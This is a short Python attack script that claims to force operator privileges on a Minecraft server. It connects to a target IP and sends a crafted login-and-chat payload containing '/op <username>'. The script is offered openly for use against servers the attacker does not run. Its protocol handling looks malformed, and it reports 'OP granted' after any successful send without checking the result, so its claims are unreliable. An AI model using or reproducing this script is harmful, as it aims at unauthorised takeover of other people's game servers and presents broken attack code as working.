import socket
import time
import sys

class DinzOnTop:
    def __init__(self, server_ip, server_port=25565, username="777Dinz"):
        self.target = (server_ip, server_port)
        self.username = username
        self.payload = self._craft_payload()

    def _craft_payload(self):
        # Malformed command to inject OP via console
        return (
            b"\x02" +  # Login packet ID
            self._varint(len(self.username)) + self.username.encode() +
            b"\x00\x00" +  # Empty verify token (cracked auth)
            b"\x01" +  # Chat message packet
            self._varint(len("/op " + self.username)) + b"/op " + self.username.encode()
        )

    def _varint(self, value):
        out = b""
        while True:
            byte = value & 0x7F
            value >>= 7
            out += bytes([byte | 0x80 if value > 0 else byte])
            if value == 0:
                break
        return out

    def exploit(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(self.target)
            s.send(self.payload)
            time.sleep(1)  # Delay for console execution
            s.close()
            print(f"[+] OP granted to {self.username}. Rejoin server.")
        except Exception as e:
            print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 forceop.py <SERVER_IP> [USERNAME]")
        sys.exit(1)
    username = sys.argv[2] if len(sys.argv) > 2 else "DinzOnTop"
    exploit = DinzOnTop(sys.argv[1], username=username)
    exploit.exploit()